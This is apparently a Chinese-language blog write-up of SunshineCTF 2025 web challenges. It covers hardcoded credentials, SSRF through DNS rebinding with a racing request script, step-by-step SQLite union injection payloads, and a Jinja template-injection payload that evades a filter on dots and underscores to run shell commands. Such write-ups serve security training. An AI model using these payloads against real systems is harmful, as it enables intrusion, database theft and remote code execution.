+++
date = '2025-10-06T11:56:00+08:00'
lastmod = '2025-10-06T11:56:00+08:00'
draft = false
title = 'SunshineCTF 2025 WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', 'SunshineCTF', '2025']

+++

## Web

### Lunar Auth

我们访问 `/admin` 路由，发现存在登录页面，我们查看网页源代码，发现用户名密码 `alimuhammadsecured/S3cur4_P@$$w0RD!`。

```js
const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
const real_passwd   = atob("UzNjdXI0X1BAJCR3MFJEIQ==");
```

登录即可拿到 flag。

### Intergalactic Webhook Service

这道题给出了源码，题目源码如下。

```python
import threading
from flask import Flask, request, abort, render_template, jsonify
import requests
from urllib.parse import urlparse
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket
import ipaddress
import uuid

def load_flag():
    with open('flag.txt', 'r') as f:
        return f.read().strip()

FLAG = load_flag()

class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()

threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()

app = Flask(__name__)

registered_webhooks = {}

def create_app():
    return app

@app.route('/')
def index():
    return render_template('index.html')

def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None

@app.route('/register', methods=['POST'])
def register_webhook():
    url = request.form.get('url')
    if not url:
        abort(400, 'Missing url parameter')
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return reason, 400
    webhook_id = str(uuid.uuid4())
    registered_webhooks[webhook_id] = url
    return jsonify({'status': 'registered', 'url': url, 'id': webhook_id}), 200

@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    webhook_id = request.form.get('id')
    if not webhook_id:
        abort(400, 'Missing webhook id')
    url = registered_webhooks.get(webhook_id)
    if not url:
        return jsonify({'error': 'Webhook not found'}), 404
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code
    except Exception:
        return jsonify({'url': url, 'error': 'something went wrong'}), 500

if __name__ == '__main__':
    print('listening on port 5000')
    app.run(host='0.0.0.0', port=5000)
```

我们可以看到它监听了 `127.0.0.1` 的 `5001` 的端口，只要我们向这个端口的 `/flag` 路由发送 POST 请求，我们就能够获得 flag。

我们看到，这道题目很明显考察的是 SSRF 漏洞的利用，但是由于它先尝试域名能否解析出 IP，以及对 IP 是否为本地地址进行了严格的检查，我们很多绕过方法都是无效的，此时我们只剩下 DNS 重绑定这一种方法可以使用。

由于它是先检查域名指向的 IP 是否“合法”之后，再去发起 POST 请求，所以它中间是有时间差的，只要我们在通过了它的检查之后并且在它发出 POST 请求之前，将 DNS 记录改成 `127.0.0.1` ，那么我们就可以成功绕过限制，获取 flag，我写了一个 python 脚本去大量发起请求，只要有一条请求满足上述要求，我们就能够解出这道题。

```python
import asyncio
import requests
from concurrent.futures import ThreadPoolExecutor
import time

# 全局标志：用于控制所有任务是否停止
should_stop = False

def sync_request_get(url):
    try:
        response = requests.get(url, timeout=5)
        return {
            "status": response.status_code,
            "content": response.text,
            "success": True
        }
        # return response.text
    except Exception as e:
        return {
            "status": None,
            "content": str(e),
            "success": False
        }

def sync_request_post(url):
    try:
        data = {
            'id': '3e57b368-1e0a-46ed-bfe6-e9f05341179c'
        }
        response = requests.post(url, data=data, verify=True)
        return {
            "status": response.status_code,
            "content": response.text,
            "success": True
        }
        # return response.text
    except Exception as e:
        return {
            "status": None,
            "content": str(e),
            "success": False
        }

async def async_request_wrapper(url, executor):
    """将同步请求包装为异步操作"""
    loop = asyncio.get_event_loop()
    # 在线程池中执行同步请求
    return await loop.run_in_executor(executor, sync_request_post, url)

async def request_worker(url, worker_id, executor):
    """请求工作协程：不断发送请求直到停止标志被激活"""
    global should_stop
    request_count = 0
    
    while not should_stop:
        request_count += 1
        print(f"Worker {worker_id} 第 {request_count} 次请求...")
        
        # 执行异步请求
        result = await async_request_wrapper(url, executor)
        
        # 检查是否满足停止条件（示例：状态码为200时停止所有任务）
        # if result["success"] and result["status"] == 200:
        #     print(f"Worker {worker_id} 满足停止条件！状态码: 200")
        #     should_stop = True  # 设置全局标志，终止所有任务
        #     break
        print(f"Worker {worker_id} 结果：{result["content"]}")
        if 'sun{' in result["content"]:
            print(f"Worker {worker_id} 满足停止条件！状态码: 200")
            should_stop = True
            break
        
        # 控制请求频率
        await asyncio.sleep(1)
    
    print(f"Worker {worker_id} 已停止，共请求 {request_count} 次")

async def main():
    target_url = "https://supernova.sunshinectf.games/trigger"
    num_workers = 5  # 线程数（并发数）
    
    # 创建线程池（限制并发线程数量）
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        # 创建多个工作协程
        workers = [
            request_worker(target_url, i+1, executor)
            for i in range(num_workers)
        ]
        
        # 同时运行所有工作协程，直到全部完成
        await asyncio.gather(*workers)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n程序被用户中断")
```

### Lunar Shop

经过简单测试，我们发现 `https://meteor.sunshinectf.games/product?product_id=3` 这里存在 SQLite 的 SQL 注入。

我们构造好闭合之后，首先要对它能够返回的数据测试，假如我们的 SQL 语句如下。

```sql
select * from xxx where id=$product_id;
```

那么我们就要构造如下语句去测试。

```plaintext
1 order by 4
1 order by 5
```

当超出了它返回数据的列数时，它会返回类似如下报错。

```plaintext
[ Error occured. --> 1st ORDER BY term out of range - should be between 1 and 4 ]
```

知道它返回的列数，我们就可以开始联合注入了。

```plaintext
0 union select 1,2,3,4
```

首先，我们可以查版本。

```plaintext
0 union select 1,2,3,sqlite_version()
```

接着，我们可以查表名和字段。

```plaintext
0 union select 1,2,3,sql from sqlite_master
0 union select 1,2,3,sql from sqlite_master where type='table'
0 union select 1,2,3,sql from sqlite_master where type='table' and name='flag'
```

![](../assets/c790f2b91901110f18804747ce1e9c64.png)

多条记录，我们可以用 `group_concat` 聚合或使用 `limit`。

```plaintext
0 union select 1,2,3,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
0 union select 1,2,3,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1
```

![](../assets/eb05475a0b8a092c81c45297df6bc1be.png)

最后，我们来查数据，也可以用 `group_concat` 来连接查询结果。

```plaintext
0 union select 1,2,id,flag from flag
0 union select 1,2,3,group_concat(flag) from flag
```

![](../assets/944531111af703c329da692749b3ca03.png)

### Web Forge

访问题目 `https://wormhole.sunshinectf.games/fetch`，返回结果 `403 Forbidden: missing or incorrect SSRF access header` 我们猜测这里需要去爆破请求头，访问 `/robots.txt` 发现以下提示。

```plaintext
User-agent: *
Disallow: /admin
Disallow: /fetch

# internal SSRF testing tool requires special auth header to be set to 'true'
```

我们要找到它要求的请求头，并将它的值设置为 true 才能去进行 SSRF 攻击。

于是，我们找了个 [header 字典](https://github.com/z1sec/Testing/blob/main/headers.txt) 开始爆破，数据包如下。

```plaintext
GET /fetch HTTP/1.1
Host: wormhole.sunshinectf.games
Connection: keep-alive
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
{{file:line(X:\CTFTools\Software\Web\Yakit\yakit-projects\temp\tmp3842183531.txt)}}: true
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9


```

爆破结果如下，我们加上请求头 `Allow: true` 即可访问。

![](../assets/b707421a8e5e0cfe1a51759e40290ffc.png)

然后尝试访问它的内网服务，得到提示 `You're trying to access /admin but forgot the ?template= parameter`，我们测试发现它的内网服务端口是 8000，测试发现，原来是打 SSTI 注入，接下来我们调试 payload。

简单尝试发现，它 WAF 了 `.` 和 `_`，我们做出相应绕过即可，payload 如下，RCE 读 flag 即可。

```plaintext
{(()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f'))()[164]}}

{{((()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f'))()[164]|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f'))['popen']('cat fla*')|attr('read')()}}
```

### Lunar File Invasion

感觉应该是存在路径穿越，可能是在 `/login?next=admin%2Fhelp` 处触发。
